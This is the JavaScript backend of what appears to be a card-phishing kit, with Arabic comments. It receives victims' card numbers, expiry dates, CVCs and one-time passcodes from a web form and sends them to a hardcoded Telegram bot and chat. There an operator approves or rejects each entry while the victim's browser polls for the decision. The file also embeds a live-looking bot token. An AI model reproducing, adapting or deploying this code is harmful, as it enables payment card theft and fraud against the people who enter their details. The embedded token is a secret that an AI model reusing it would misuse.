export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const method = req.method;
  const body = req.body || {};

  // 1. إذا طلب المتصفح فحص حالة الـ OTP (الاستعلام المباشر من تليجرام)
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      // فحص أحدث تفاعلات الأزرار من تليجرام مباشرة بدون الحاجة لذاكرة سيرفر
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-30&allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();

      let status = 'pending';
      if (tgData.ok && tgData.result) {
        for (const update of tgData.result) {
          if (update.callback_query) {
            const data = update.callback_query.data;
            // التحقق مما إذا كان الزر المضغوط يخص هذا الـ user_id بالذات
            if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
              status = 'approved';
              break;
            } else if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
              status = 'rejected';
              break;
            }
          }
        }
      }
      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. إذا ضغطت أنت على الأزرار في تليجرام (تأكيد الضغطة وإرسال الرد للبوت)
  if (body.callback_query) {
    const callback = body.callback_query;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: callback.message.text + "\n\n✅ **[تمت الموافقة بنجاح]**",
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك!" })
    });

    return res.status(200).json({ ok: true });
  }

  // 3. إرسال بيانات الفيزا أو الـ OTP إلى تليجرام
  let text = '';
  let actionType = 'pay';

  if (body.رمز_التحقق_OTP) {
    actionType = 'otp';
    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
           `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  } else {
    actionType = 'pay';
    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
           `👤 اسم الحامل: ${body.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${body.card_number || ''}\`\n` +
           `📅 الانتهاء: ${body.exp_date || ''}\n` +
           `🔒 CVC: \`${body.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${actionType}_${body.user_id}` },
        { text: "❌ رفض", callback_data: `reject_${actionType}_${body.user_id}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
